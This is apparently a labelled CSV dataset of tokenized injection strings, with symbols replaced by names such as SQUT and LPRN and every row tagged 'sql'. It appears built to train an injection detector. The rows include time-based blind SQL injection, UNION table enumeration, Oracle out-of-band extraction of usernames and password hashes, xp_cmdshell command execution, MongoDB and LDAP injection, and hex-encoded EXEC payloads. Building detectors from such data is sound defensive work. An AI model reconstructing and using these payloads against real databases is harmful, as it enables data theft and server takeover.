3,SQUT SMCLN IF NOT LPRN SUBSTRING LPRN LPRN SELECT ATR ATR VERSION RPRN CMMA INT CMMA INT RPRN LT GT INT RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,sql
4,SQUT SMCLN IF NOT LPRN SELECT SYSTEM_USER RPRN LT GT SQUT sa SQUT waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,sql
5,SQUT SMCLN IF is_srvrolemember LPRN SQUT sysadmin SQUT RPRN GT INT waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,sql
6,SQUT SMCLN IF NOT LPRN LPRN SELECT serverproperty LPRN SQUT isintegratedsecurityonly SQUT RPRN RPRN LT GT INT RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,sql
7,SQUT SMCLN IF NOT LPRN LPRN SELECT serverproperty LPRN SQUT isintegratedsecurityonly SQUT RPRN RPRN LT GT INT RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,sql
0,INT SQUT INT,sql
1,INT EXEC sp_ LPRN OR EXEC xp_ RPRN,sql
2,INT AND INT EQ INT,sql
3,INT SQUT AND INT EQ LPRN SELECT COUNT LPRN STAR RPRN FROM tablenames RPRN SMCLN MINUS MINUS,sql
4,INT OR INT EQ INT,sql
5,INT SQUT OR SQUT INT SQUT EQ SQUT INT,sql
6,1or1 EQ INT,sql
7,INT SQUT OR SQUT INT SQUT EQ SQUT INT,sql
8,fake ATR ema SQUT OR SQUT il DOT nl SQUT EQ SQUT il DOT nl,sql
0,INT,sql
1,INT AND user_name LPRN RPRN EQ SQUT dbo SQUT,sql
2,BSLSH SQUT SMCLN DESC users SMCLN MINUS MINUS,sql
3,INT BSLSH SQUT INT,sql
4,INT SQUT AND non_existant_table EQ SQUT INT,sql
5,SQUT OR username IS NOT NULL OR username EQ SQUT,sql
6,INT AND ascii LPRN LOWER LPRN SUBSTRING LPRN LPRN SELECT top INT NAME FROM sysobjects WHERE xtype EQ SQUT u SQUT RPRN CMMA INT CMMA INT RPRN RPRN RPRN GT INT,sql
7,INT UNION ALL SELECT INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA NAME FROM sysobjects WHERE xtype EQ SQUT u SQUT MINUS MINUS,sql
8,INT uni SLSH STAR STAR SLSH ON SELECT ALL FROM WHERE,sql
9,,sql
0,TRUE CMMA DLLR WHERE CLN SQUT INT EQ EQ INT SQUT,sql
1,CMMA DLLR WHERE CLN SQUT INT EQ EQ INT SQUT,sql
2,DLLR WHERE CLN SQUT INT EQ EQ INT SQUT,sql
3,SQUT CMMA DLLR WHERE CLN SQUT INT EQ EQ INT SQUT,sql
4,INT CMMA DLLR WHERE CLN SQUT INT EQ EQ INT SQUT,sql
5,LCBR DLLR ne CLN INT RCBR,sql
6,SQUT CMMA DLLR OR CLN LSQBR LCBR RCBR CMMA LCBR SQUT A SQUT CLN SQUT A,sql
7,SQUT RCBR RSQBR CMMA DLLR COMMENT CLN SQUT successful mongodb injection SQUT,sql
8,DB DOT injection DOT INSERT LPRN LCBR success CLN INT RCBR RPRN SMCLN,sql
9,DB DOT injection DOT INSERT LPRN LCBR success CLN INT RCBR RPRN SMCLN RETURN INT SMCLN DB DOT stores DOT mapreduce LPRN FUNCTION LPRN RPRN LCBR LCBR emit LPRN INT CMMA INT,sql
10,BITOR BITOR INT EQ EQ INT,sql
11,SQUT BITAND BITAND this DOT PASSWORD DOT MATCH LPRN SLSH DOT STAR SLSH RPRN SLSH SLSH PLUS PRCNT INT,sql
12,SQUT BITAND BITAND this DOT passwordzz DOT MATCH LPRN SLSH DOT STAR SLSH RPRN SLSH SLSH PLUS PRCNT INT,sql
13,SQUT PRCNT INT PRCNT INT PRCNT INT PRCNT 20this DOT PASSWORD DOT MATCH LPRN SLSH DOT STAR SLSH RPRN SLSH SLSH PLUS PRCNT INT,sql
14,SQUT PRCNT INT PRCNT INT PRCNT INT PRCNT 20this DOT passwordzz DOT MATCH LPRN SLSH DOT STAR SLSH RPRN SLSH SLSH PLUS PRCNT INT,sql
15,LCBR DLLR gt CLN SQUT SQUT RCBR,sql
16,LSQBR DLLR ne RSQBR EQ INT,sql
17,SQUT SMCLN sleep LPRN INT RPRN SMCLN,sql
18,SQUT SMCLN sleep LPRN INT RPRN SMCLN SQUT,sql
19,SQUT SMCLN sleep LPRN INT RPRN SMCLN PLUS SQUT,sql
20,SQUT SMCLN it EQ NEW PRCNT 20date LPRN RPRN SMCLN DO LCBR pt EQ NEW PRCNT 20date LPRN RPRN SMCLN RCBR WHILE LPRN pt MINUS it LT INT RPRN SMCLN,sql
0,â€™ OR â€˜1â€™ EQ â€™1,sql
1,SQUT OR SQUT INT SQUT EQ SQUT INT,sql
2,SQUT BITOR BITOR utl_http DOT request LPRN SQUT http CLN SLSH SLSH INT DOT INT DOT INT DOT INT SLSH SQUT RPRN BITOR BITOR SQUT,sql
3,SQUT BITOR BITOR myappadmin DOT adduser LPRN SQUT ADMIN SQUT CMMA SQUT newpass SQUT RPRN BITOR BITOR SQUT,sql
4,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT banner FROM v DLLR VERSION WHERE rownum EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
5,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT sys DOT login_user FROM DUAL RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
6,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT sys DOT database_name FROM DUAL RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
7,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT host_name FROM v DLLR INSTANCE RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
8,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT global_name FROM global_name RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
9,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT COUNT LPRN DISTINCT LPRN username RPRN RPRN FROM sys DOT all_users RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
10,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT COUNT LPRN DISTINCT LPRN PASSWORD RPRN RPRN FROM sys DOT USER DLLR RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
11,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT COUNT LPRN DISTINCT LPRN TABLE_NAME RPRN RPRN FROM sys DOT all_tables RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
12,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT COUNT LPRN DISTINCT LPRN COLUMN_NAME RPRN RPRN FROM sys DOT all_tab_columns RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
13,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT COUNT LPRN DISTINCT LPRN granted_role RPRN RPRN FROM dba_role_privs WHERE grantee EQ sys DOT login_user RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
14,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN username RPRN FROM LPRN SELECT DISTINCT LPRN username RPRN CMMA rownum AS LIMIT FROM sys DOT all_users RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
15,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN PASSWORD RPRN FROM LPRN SELECT DISTINCT LPRN PASSWORD RPRN CMMA rownum AS LIMIT FROM sys DOT USER DLLR RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
16,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN FROM LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN CMMA rownum AS LIMIT FROM sys DOT all_tables RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
17,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN FROM LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN CMMA rownum AS LIMIT FROM all_tab_columns RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
18,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN granted_role RPRN FROM LPRN SELECT DISTINCT LPRN granted_role RPRN CMMA rownum AS LIMIT FROM dba_role_privs WHERE grantee EQ sys DOT loginuser RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
19,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN username RPRN FROM LPRN SELECT DISTINCT LPRN username RPRN CMMA rownum AS LIMIT FROM sys DOT all_users RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
20,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN PASSWORD RPRN FROM LPRN SELECT DISTINCT LPRN PASSWORD RPRN CMMA rownum AS LIMIT FROM sys DOT USER DLLR RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
21,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN FROM LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN CMMA rownum AS LIMIT FROM sys DOT all_tables RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
22,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN FROM LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN CMMA rownum AS LIMIT FROM all_tab_columns RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
23,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN granted_role RPRN FROM LPRN SELECT DISTINCT LPRN granted_role RPRN CMMA rownum AS LIMIT FROM dba_role_privs WHERE grantee EQ sys DOT loginuser RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
24,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN username RPRN FROM LPRN SELECT DISTINCT LPRN username RPRN CMMA rownum AS LIMIT FROM sys DOT all_users RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
25,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN PASSWORD RPRN FROM LPRN SELECT DISTINCT LPRN PASSWORD RPRN CMMA rownum AS LIMIT FROM sys DOT USER DLLR RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
26,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN FROM LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN CMMA rownum AS LIMIT FROM sys DOT all_tables RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
27,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN FROM LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN CMMA rownum AS LIMIT FROM all_tab_columns RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
28,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN granted_role RPRN FROM LPRN SELECT DISTINCT LPRN granted_role RPRN CMMA rownum AS LIMIT FROM dba_role_privs WHERE grantee EQ sys DOT loginuser RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
29,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN username RPRN FROM LPRN SELECT DISTINCT LPRN username RPRN CMMA rownum AS LIMIT FROM sys DOT all_users RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
30,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN PASSWORD RPRN FROM LPRN SELECT DISTINCT LPRN PASSWORD RPRN CMMA rownum AS LIMIT FROM sys DOT USER DLLR RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
31,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN FROM LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN CMMA rownum AS LIMIT FROM sys DOT all_tables RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
32,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN FROM LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN CMMA rownum AS LIMIT FROM all_tab_columns RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
33,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN granted_role RPRN FROM LPRN SELECT DISTINCT LPRN granted_role RPRN CMMA rownum AS LIMIT FROM dba_role_privs WHERE grantee EQ sys DOT loginuser RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
34,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN username RPRN FROM LPRN SELECT DISTINCT LPRN username RPRN CMMA rownum AS LIMIT FROM sys DOT all_users RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
35,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN PASSWORD RPRN FROM LPRN SELECT DISTINCT LPRN PASSWORD RPRN CMMA rownum AS LIMIT FROM sys DOT USER DLLR RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
36,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN FROM LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN CMMA rownum AS LIMIT FROM sys DOT all_tables RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
37,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN FROM LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN CMMA rownum AS LIMIT FROM all_tab_columns RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
38,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN granted_role RPRN FROM LPRN SELECT DISTINCT LPRN granted_role RPRN CMMA rownum AS LIMIT FROM dba_role_privs WHERE grantee EQ sys DOT loginuser RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
39,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN username RPRN FROM LPRN SELECT DISTINCT LPRN username RPRN CMMA rownum AS LIMIT FROM sys DOT all_users RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
40,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN PASSWORD RPRN FROM LPRN SELECT DISTINCT LPRN PASSWORD RPRN CMMA rownum AS LIMIT FROM sys DOT USER DLLR RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
41,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN FROM LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN CMMA rownum AS LIMIT FROM sys DOT all_tables RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
42,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN FROM LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN CMMA rownum AS LIMIT FROM all_tab_columns RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
43,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN granted_role RPRN FROM LPRN SELECT DISTINCT LPRN granted_role RPRN CMMA rownum AS LIMIT FROM dba_role_privs WHERE grantee EQ sys DOT loginuser RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
44,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN username RPRN FROM LPRN SELECT DISTINCT LPRN username RPRN CMMA rownum AS LIMIT FROM sys DOT all_users RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
45,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN PASSWORD RPRN FROM LPRN SELECT DISTINCT LPRN PASSWORD RPRN CMMA rownum AS LIMIT FROM sys DOT USER DLLR RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
46,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN FROM LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN CMMA rownum AS LIMIT FROM sys DOT all_tables RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
47,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN FROM LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN CMMA rownum AS LIMIT FROM all_tab_columns RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
48,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN granted_role RPRN FROM LPRN SELECT DISTINCT LPRN granted_role RPRN CMMA rownum AS LIMIT FROM dba_role_privs WHERE grantee EQ sys DOT loginuser RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
49,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN username RPRN FROM LPRN SELECT DISTINCT LPRN username RPRN CMMA rownum AS LIMIT FROM sys DOT all_users RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
50,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN PASSWORD RPRN FROM LPRN SELECT DISTINCT LPRN PASSWORD RPRN CMMA rownum AS LIMIT FROM sys DOT USER DLLR RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
51,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN FROM LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN CMMA rownum AS LIMIT FROM sys DOT all_tables RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
52,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN FROM LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN CMMA rownum AS LIMIT FROM all_tab_columns RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
53,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN granted_role RPRN FROM LPRN SELECT DISTINCT LPRN granted_role RPRN CMMA rownum AS LIMIT FROM dba_role_privs WHERE grantee EQ sys DOT loginuser RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,sql
54,,sql
0,LT GT DQUT SQUT PRCNT SMCLN RPRN LPRN BITAND PLUS,sql
1,BITOR,sql
2,EXCLM,sql
3,QSTN,sql
4,SLSH,sql
5,SLSH SLSH,sql
6,SLSH SLSH STAR,sql
7,SQUT,sql
8,SQUT MINUS MINUS,sql
9,LPRN,sql
10,RPRN,sql
11,STAR BITOR,sql
12,STAR SLSH STAR,sql
13,BITAND,sql
14,INT,sql
15,INT,sql
16,INT OR INT EQ INT,sql
17,0x730065006c00650063007400200040004000760065007200730069006f006e00 EXEC LPRN ATR q RPRN,sql
18,0x770061006900740066006f0072002000640065006c00610079002000270030003a0030003a,sql
19,0x77616974666f722064656c61792027303a303a31302700 EXEC LPRN ATR s RPRN,sql
20,INT SMCLN LPRN load_file LPRN CHAR LPRN INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT RPRN RPRN RPRN CMMA INT CMMA INT CMMA INT SMCLN,sql
21,INT OR INT EQ INT,sql
22,INT SMCLN SELECT PRCNT INT STAR,sql
23,INT waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,sql
24,SQUT PRCNT 20or PRCNT INT SQUT SQUT EQ SQUT,sql
25,SQUT PRCNT 20or PRCNT INT EQ INT,sql
26,SQUT RPRN PRCNT 20or PRCNT INT LPRN SQUT x SQUT EQ SQUT x,sql
27,SQUT PRCNT 20or PRCNT INT SQUT x SQUT EQ SQUT x,sql
28,PRCNT 20or PRCNT 20x EQ x,sql
29,PRCNT INT SQUT sleep PRCNT INT SQUT,sql
30,PRCNT INT DLLR LPRN sleep PRCNT INT RPRN,sql
31,PRCNT INT,sql
32,INT OR INT EQ INT,sql
33,PRCNT INT,sql
34,PRCNT INT PRCNT 20or PRCNT INT EQ INT,sql
35,PRCNT INT,sql
36,PRCNT INT,sql
37,PRCNT 2a PRCNT INT PRCNT 7c PRCNT 28mail PRCNT 3d PRCNT 2a PRCNT INT PRCNT INT,sql
38,PRCNT 2a PRCNT INT PRCNT 7c PRCNT 28objectclass PRCNT 3d PRCNT 2a PRCNT INT PRCNT INT,sql
39,PRCNT 2a PRCNT 7c,sql
40,BITOR BITOR INT,sql
41,SQUT BITOR BITOR SQUT INT,sql
42,LPRN BITOR BITOR INT RPRN,sql
43,PRCNT 7c,sql
44,A SQUT,sql
45,ADMIN SQUT OR SQUT,sql
46,SQUT AND INT EQ LPRN IF LPRN LPRN load_file LPRN CHAR LPRN INT CMMA INT CMMA INT CMMA INT CMMA INT RPRN RPRN LT GT CHAR LPRN INT CMMA INT RPRN RPRN CMMA INT CMMA INT RPRN RPRN SMCLN,sql
47,SQUT AND INT IN LPRN SELECT var FROM TEMP RPRN MINUS MINUS,sql
48,anything SQUT OR SQUT x SQUT EQ SQUT x,sql
49,DQUT A DQUT DQUT OR INT EQ INT MINUS MINUS DQUT,sql
50,A SQUT OR INT EQ INT MINUS MINUS,sql
51,DQUT A DQUT DQUT OR INT EQ INT MINUS MINUS DQUT,sql
52,A SQUT OR INT EQ INT MINUS MINUS,sql
53,A SQUT OR SQUT A SQUT EQ SQUT A,sql
54,BITAND apos SMCLN PRCNT 20or,sql
55,AS,sql
56,ASC,sql
57,A SQUT waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,sql
58,SQUT SMCLN BEGIN DECLARE ATR var VARCHAR LPRN INT RPRN SET ATR var EQ SQUT CLN SQUT SELECT ATR var EQ ATR var PLUS SQUT PLUS login PLUS SQUT SLSH SQUT PLUS PASSWORD PLUS SQUT SQUT FROM users WHERE login GT,sql
59,bfilename,sql
60,CHAR PRCNT INT PRCNT INT PRCNT 2b PRCNT 40select,sql
61,DECLARE ATR q nvarchar LPRN INT RPRN 0x730065006c00650063007400200040004000760065007200730069006f006e00 EXEC LPRN ATR q RPRN,sql
62,DECLARE ATR q nvarchar LPRN INT RPRN SELECT ATR q EQ 0x770061006900740066006f0072002000640065006c00610079002000270030003a0030003a0031003000270000 EXEC LPRN ATR q RPRN,sql
63,DECLARE ATR q nvarchar LPRN INT RPRN SELECT ATR q EQ,sql
64,DECLARE ATR s VARCHAR LPRN INT RPRN SELECT ATR s EQ 0x73656c65637420404076657273696f6e EXEC LPRN ATR s RPRN,sql
65,DECLARE ATR s VARCHAR LPRN INT RPRN SELECT ATR s EQ 0x77616974666f722064656c61792027303a303a31302700 EXEC LPRN ATR s RPRN,sql
66,DECLARE ATR s VARCHAR LPRN INT RPRN SELECT ATR s EQ,sql
67,DECLARE ATR s VARCHAR LPRN INT RPRN SELECT ATR s EQ 0x73656c65637420404076657273696f6e,sql
68,DELETE,sql
69,DESC,sql
70,DISTINCT,sql
71,SQUT BITOR BITOR LPRN elt LPRN MINUS INT PLUS INT CMMA bin LPRN INT RPRN CMMA ord LPRN INT RPRN CMMA HEX LPRN CHAR LPRN INT RPRN RPRN RPRN RPRN,sql
72,SQUT SMCLN EXEC master DOT DOT xp_cmdshell,sql
73,SQUT SMCLN EXEC master DOT DOT xp_cmdshell SQUT ping INT DOT INT DOT INT DOT INT SQUT MINUS MINUS,sql
74,EXEC LPRN ATR s RPRN,sql
75,SQUT SMCLN EXEC LPRN SQUT sel SQUT PLUS SQUT ect us SQUT PLUS SQUT er SQUT RPRN,sql
76,EXEC sp,sql
